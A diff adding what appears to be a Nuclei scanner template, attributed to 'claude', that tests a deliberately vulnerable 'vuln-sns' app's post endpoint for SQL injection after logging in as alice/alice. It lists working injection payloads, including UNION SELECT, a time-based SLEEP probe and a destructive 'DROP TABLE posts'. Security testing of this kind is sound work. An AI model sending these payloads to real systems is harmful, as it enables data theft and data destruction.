@@ -1,0 +1,56 @@
+id: vuln-sns-posts-sql-injection
+info:
+  name: Vuln SNS Posts - SQL Injection
+  author: claude
+  severity: critical
+  description: |
+    Tests for SQL injection vulnerabilities in posts creation endpoint.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: vuln-sns,sqli,posts,authenticated
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"user_id":"alice","password":"alice"}
+        
+      - |
+        POST /api/posts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        
+        {"content":"{{payload}}"}
+
+    payloads:
+      payload:
+        - "Test' OR '1'='1"
+        - "Test' OR '1'='1' --"
+        - "Test' UNION SELECT null,null,null --"
+        - "Test'; DROP TABLE posts; --"
+        - "Test' AND SLEEP(5) --"
+
+    extractors:
+      - type: regex
+        name: token
+        regex:
+          - '"token":\s*"([^"]+)"'
+        part: body_1
+        internal: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql error"
+        condition: or
+        part: body_2
+
+      - type: dsl
+        dsl:
+          - 'duration_2>=5'
